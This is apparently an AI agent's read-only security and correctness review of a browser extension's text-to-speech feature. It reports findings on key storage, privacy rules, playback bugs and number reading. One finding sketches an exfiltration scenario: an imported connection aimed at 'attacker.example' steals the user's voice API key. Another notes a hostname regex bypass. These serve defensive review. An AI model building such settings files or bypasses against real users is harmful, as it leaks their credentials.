# Code review: text-to-speech, phases 3–7 (feat/text-to-speech)

Date: 2026-10-26 · Scope: `git diff master..HEAD -- src tests scripts wxt.config.ts` (d69aefa, 0362efc, e76ea97, 999f2b1),
49 files, +3820/−22. Read-only review: no source edits and no builds. The existing TTS tests pass (10 files, 192 tests).
Probes are in the scratchpad (`.../scratchpad/tts/*.probe.test.ts`, run with a scratch vitest config rooted at the worktree).

## Summary

The engine, adapter and settings layers are clean. Keys never go into sync or export. `keyFrom` is limited to the preset
base URL. Azure's region is validated, and stop/abort is handled well in the cloud engine. Four problems should block the
merge:

1. A voice key can leave through an imported translation connection.
2. Voice prep sends page text on never-translate sites.
3. Read-on can read the wrong block.
4. After a provider is re-saved, the panel can send the new key to the old base URL.

## High

### H1. A voice key can be taken by an imported *translation* connection, which bypasses the import redirect guard
- `src/tts/settings.ts:50` stores voice keys as `secret:tts-<preset>` (via `saveApiKey`). That is the same namespace
  as translation keys (`src/shared/settings.ts:207`, `secretKey = secret:<connectionId>`).
- A translation connection id is any `nonEmpty` string (`src/shared/providers.ts:184`). On import it only has to match
  `ID_RE = /^[A-Za-z0-9._-]{1,100}$/` (`src/shared/portable.ts:70`, `:293`), so `tts-gemini` passes.
- **Scenario:** a settings file adds a translation connection `{id: "tts-gemini", baseUrl: "https://attacker.example/v1",
  protocol: "openai", auth: {style: "bearer"}}` and a profile or route using it.
  - In `resolveImport` (`portable.ts:646–660`) this is an *added* connection, not a redirect, so no key action is shown
    and nothing is removed.
  - The next translation, or a Test connection, reads `secret:tts-gemini` (the user's Gemini voice key) and sends it as
    a Bearer token to the attacker.
  - `hasHostPermission` is only used to classify errors (`src/llm/sdk.ts:87`). A CORS-permissive server gets the request.
- The reverse also happens: removing that translation connection (`removeConnection`) deletes the voice key.
- **Fix (pick one):**
  - Store voice keys under a separate prefix (for example `secret:tts:`, or `ttsSecret:<id>`), with a one-time move.
  - Or reject translation connection ids that start with `tts-` in `cleanConnection` and in `importConnection`.
- Add a portable test: importing a translation connection whose id collides with a voice connection must not read the
  voice key.

### H2. Voice prep sends page text to the translation LLM on never-translate sites (and on "ask first" sites)
- `src/entrypoints/sidepanel/App.tsx:355` builds `voicePrep` for every `view.kind === 'ready'` page.
- A page on the never-translate list is still a `ready` view, held with an offer (`translator.ts:355`, `:409`;
  `offers.ts:3`: "a page on the never-translate list is not sent").
- `BlockActions` now shows Read aloud for untranslated blocks (`SegmentList.tsx`, the `!done` branch).
- `Jobs.speechClient` (`jobs.ts:1594`) checks the route, the privacy notice and the spend limit. It does not check the
  never list or the site's ask/allow mode.
- **Scenario:** the user puts a site on the never list. They then click Read aloud on a block with a cloud voice set up
  and the privacy notice already acknowledged. `prepare` sends the block plus the blocks before and after it to the
  cloud translation model. The cloud TTS request itself also sends the block to the voice provider. The product
  promises that a never-translate site sends nothing.
- **Fix:**
  - Pass the page's offer reason (or `isNeverTranslate(url)`) into `voicePrepVia`/`speechClient`, and return `undefined`
    for `never` (and arguably for `ask`, where the user has not asked to translate).
  - Decide whether a cloud *voice* may read never-translate or local-only pages at all (see Q1). If not, `useReadAloud`
    should fall back to the system voice there.

### H3. Read-on plays the prefetched text of the wrong block when the next block changes during playback
- `src/tts/controller.ts:95–99` prepares and prefetches `upcoming = following(block, next)` while the current block
  plays.
- After the current block ends, the controller recomputes `block = following(block, next)` (line 110). It then uses
  `ahead` regardless of which block `ahead` was made for (line 90).
- `following` skips blocks whose translation is not final yet (`blockText` returns `''`). So during a page that is still
  translating, which is the usual case for read-on, B's translation can arrive while A plays.
- **Probe output** (cloud-like engine, B empty at prefetch time, filled 5 ms later):
  - Calls: `speak:alpha, prefetch:gamma, speak:gamma, prefetch:gamma, speak:gamma`
  - States: `reading:A, reading:B, reading:C, idle`
  - So B is highlighted while C's text is read, then C is read again, and B is never read.
- The same happens when a block is retranslated or edited during playback: the old prepared text is read.
- **Fix:** keep the target with the promise (`ahead = { id: target.id, text: target.text, p }`). Use it only when
  `ahead.id === block.id && ahead.text === block.text`; otherwise drop it and `prepare(block)` again.

## Medium

### M1. The panel keeps a cloud engine built from a stale connection, so a re-saved provider's new key goes to the old base URL
- `read-aloud.ts:97–108` caches the engine by `JSON.stringify(settings)`. The `ttsConn:<id>` record (baseUrl, model,
  keyFrom, region) is not part of that key.
- `cloudEngine` captures `conn` once (`cloud-engine.ts:50`) but reads the key fresh on every request
  (`readTtsKey`, line 55/72).
- Re-adding a provider in Settings › Voice keeps the id `tts-openai`. `update({engine: 'cloud', connectionId: same})`
  then leaves `tts` unchanged (`Voice.tsx:215`), so the open panel keeps the old engine.
- **Scenario:**
  - The user moves the OpenAI-compatible voice from gateway A to gateway B and pastes B's key.
  - The panel sends B's key to A until the panel reloads or the settings change.
  - Likewise, a Region or model change is ignored.
- **Fix:** include the connection record in the cache key: watch `ttsConn:*` in `storage.sync.onChanged`, or have
  `engineFor` re-read the connection and compare it. Alternatively, bind the key read to the `conn` snapshot (read
  `conn` and key together on every `resolve`).

### M2. An external interruption leaves the panel stuck in "reading"
- `system.ts:91` resolves a clause as `'stopped'` on `interrupted`/`cancelled`. `controller.ts:102` then `return`s
  without `set({status: 'idle'})` when `mine === run`.
- chrome.tts is shared across the browser. In this extension, Settings › Voice's Test and voice picker
  (`Voice.tsx:108–119`) call `chrome.tts.speak`, which interrupts the panel's utterance. A second window's panel or
  another extension does the same.
- **Probe output:** after an external `stopped`, `ra.state` is `{status: 'reading', blockId: 'A'}`. The strip and the
  Stop button stay until the user presses Stop.
- **Fix:** at line 102, when `end === 'stopped' && mine === run`, clear `current` and `set({status: 'idle'})` before
  returning.

### M3. Vietnamese numbers with a dot decimal are read as integers
- `parseNumber` (`speakable.ts:131–147`) in vi treats every `.` as a thousands separator, even when the group is not
  3 digits.
- **Probe output:**
  - `Giá 1.5 triệu đồng` → `mười lăm triệu` (10× wrong)
  - `Phiên bản 2.5` → `hai mươi lăm`
  - `192.168.1.1` → `mười chín triệu hai trăm…`
- English has the mirror case: `In 1,5 seconds` → `fifteen`.
- Dot decimals are common in Vietnamese web text and in LLM translations from English.
- **Fix:**
  - Treat the thousands separator as grouping only when every group after the first is exactly 3 digits (the
    `grouped()` test).
  - Read one separator followed by 1–2 digits (or 4 or more) as a decimal in either language.
  - Leave multi-dot non-grouped runs (versions, IPs) as digits.

### M4. Error mapping deviates from the S11 table
- `classifyStatus` (`cloud/request.ts:26`) only allows "quota" for 429/400/402/403/5xx. ElevenLabs' `quota_exceeded`
  comes back as 401, which S11 maps to quota ("match `detail.status` before falling back to auth").
  - Probe: `classifyStatus(401, "This request exceeds your quota…")` → `auth`.
  - The user is told their key was refused when they are out of credits.
- The bare `quota` word in the regex also turns per-minute 429s into `quota`:
  - Google Cloud: "Quota exceeded for … Requests per minute" → `quota`; S11 says `rate_limit`.
  - Gemini: "You exceeded your current quota … per minute" → `quota`; S11 says only "per day" is quota.
- Azure DNS failure (bad region) is mapped to `network`; S11 says `bad_request` "check the region".
- **Fix:**
  - Allow 401 in the quota branch when the message or `detail.status` says `quota_exceeded`.
  - For 429, map to quota only on `per day|insufficient_quota|credit|balance`, and keep `rate_limit` otherwise.
  - Map a fetch `TypeError` for the Azure preset to `bad_request` when `navigator.onLine`.

### M5. Picking a cloud voice plays overlapping samples and spends requests on every change
- `Voice.tsx:113–119` speaks the sample on every `<select>` change and never stops the previous playback.
- For a cloud engine, each change is a provider request and a new `<audio>`. Arrow-keying through the list plays several
  samples at once.
- With Gemini's free tier (10 TTS requests/day per model, S11), browsing voices can use up the day's allowance.
- **Fix:**
  - Keep the last `Playback` in a ref and `stop()` it before the next one.
  - Debounce the pick, or play the sample only from an explicit "Play" button for cloud engines.

## Low

- **L1. `PGS.TS.` / `GS.TS.` lose the second title** (`speakable.ts:165–176`, `:214`). `TS.` runs before `GS.`, and its
  lookbehind `(?<![\p{L}\p{N}.])` rejects the `.` before it. Probe: `PGS.TS. Nguyễn Văn A` → `phó giáo sư TS. Nguyễn…`.
  This academic title is very common in Vietnamese. Fix: expand titles in a loop until nothing changes, or allow a
  preceding `.` that ends another known abbreviation.
- **L2. English money with cents.** `$1.50` → `one point five zero dollars`, and `$2.99` likewise
  (`speakable.ts:259–262`). Fix: for `$N.NN`, read `N dollars and NN cents`.
- **L3. Single-letter words block sentence splits.** The `initial` rule (`speakable.ts:310`) treats any one-letter word
  before `.` as an initial. Vietnamese sentence-final particles (`ạ`, `à`, `ư`, `ừ`) and `vitamin C.` then merge two
  sentences. Probe: `Cảm ơn anh ạ. Em đi đây.` is one clause, so the sentence pause and the clause boundary for cloud
  pieces are lost. Fix: limit the initial rule to an uppercase letter that is followed by another capitalised word and
  not preceded by a lowercase word, or exempt lowercase letters.
- **L4. Rejected promises are cached for the page.**
  - `read-aloud.ts:122` `void p.then(...)` has no rejection handler. If `voicePrep` rejects (the dynamic
    `import('@/tts/prepare')` fails after an extension update), this is an unhandled rejection. The rejected `p` also
    stays in `prepared`, so every replay of that block fails until the page changes.
  - The `engine` promise (`read-aloud.ts:103–105`) is cached the same way on rejection.
  - Fix: `p.then(cb, () => prepared.current.delete(key))`, and reset `engine` on rejection.
- **L5. `keyFrom` is not tied to the service.** `cleanTtsConnection` (`settings.ts:80`) accepts any `keyFrom` when the
  base URL is the preset's. An imported file can then point Gemini TTS at the user's OpenAI translation connection, so
  the OpenAI key goes to Google. A translation connection later moved to another server can also have its new key sent
  to the preset's host. Fix: when reading the key (`readTtsKey`), check that the referenced translation connection's
  preset or origin matches the TTS preset, the same rule `reusableKeys` uses (`Voice.tsx:59`). Also anchor that regex
  (`^https://api\.openai\.com(/|$)`, since `\b` matches `api.openai.com.evil`).
- **L6. Reuse plus a custom base saves a provider with no key.** In `AddProvider` (`Voice.tsx:249–277`), ticking "reuse
  key" and typing a custom base URL saves without a key: `keyFrom` is dropped by `cleanTtsConnection`, and the key field
  was hidden. The first read then fails with `auth`. Fix: hide or disable the reuse option when a custom base is typed,
  or show an error.
- **L7. Imported voices can enable a network voice silently.** An imported `tts.voices.vi` can name a Chrome network
  voice ("Google Tiếng Việt"). The import summary says only "voice settings", so text starts going to Google without a
  pick on this device. Consider listing the chosen voices in the import summary, or dropping remote system voice names
  on import.
- **L8. Plan ids in new code comments.** `src/tts/types.ts:1`, `src/tts/prepare.ts:1`,
  `src/engine/prompts/tts-prepare.ts:1` and `src/entrypoints/sidepanel/read-aloud.ts:1` cite "plan 261026-1433 phase N".
  This breaks `.claude/rules/review-audit-self-decision.md`.

## Checked and not a finding

- **Concurrency in `cloud-engine.ts`:**
  - Stop aborts both the playback's own requests and the prefetch.
  - Aborted cache entries are deleted in the rejection microtask chain, before any new user event, so a replay does not
    get an aborted promise.
  - The `.catch` on the next piece and on the prefetch prevents unhandled rejections.
  - `speak().done` maps abort to `'stopped'`.
- **Concurrency in `controller.ts`:** stale runs are cut by `mine !== run` after each await. A new `play()` stops the old
  playback before it speaks.
- **`system.ts`:** a remote (network) voice is used only when picked by name (`pickVoice`). It is never a fallback for
  another language.
- **`speechClient`:** it mirrors `Jobs.cleared`'s off-device rule and the spend limit. It uses the page's translate
  route, so local-only *site rules* keep voice prep on the device. Spend is counted under `voice-prep`.
- **Import:** an imported editable base URL that differs, or an imported `keyFrom`, drops the stored own key
  (`portable.ts:662–665`). Non-editable presets always get the preset base URL. The region is limited to
  `[a-z0-9-]`, so the Azure host can't be redirected.
- **SegmentList re-renders:** `speaking` is a per-block prop compared in `changed`, and `SpeechActions` is a stable
  memoised context, so only the old and the new reading block re-render.

## Open questions

1. **Product decision on local-only and never-translate sites.** Should a cloud voice read text on a local-only site or
   a never-translate site at all? The TTS request itself sends the block to the voice provider. `docs/privacy.md:82`
   promises that local-only sites never reach a cloud provider. Today only voice prep respects local-only, and nothing
   respects the never list.
2. **Spend limit for voice requests.** Cloud TTS requests are not counted toward the spend limit (BYOK, no pricing).
   Is that intended? Phase 9 privacy and spend docs should say so.
3. **Gemini free tier.** S11 says "Phase 6 must send several blocks per request" for Gemini's free tier
   (10 requests/day). The adapter sends one request per block, plus a prefetch. Was this descoped on purpose? It is not
   in phase-06.

Status: DONE_WITH_CONCERNS
Summary: Found 3 high issues: a voice key can be taken by an imported translation connection with id `tts-*`; voice prep
sends page text on never-translate sites; and read-on can play the wrong block's prefetched text. There are also 5
medium issues, including the panel sending a re-saved key to the old base URL and the reading state staying on after an
external chrome.tts interrupt. Each finding was verified by reading the code, and H3, M2, M3, M4 and L1–L3 also by
scratch probes.
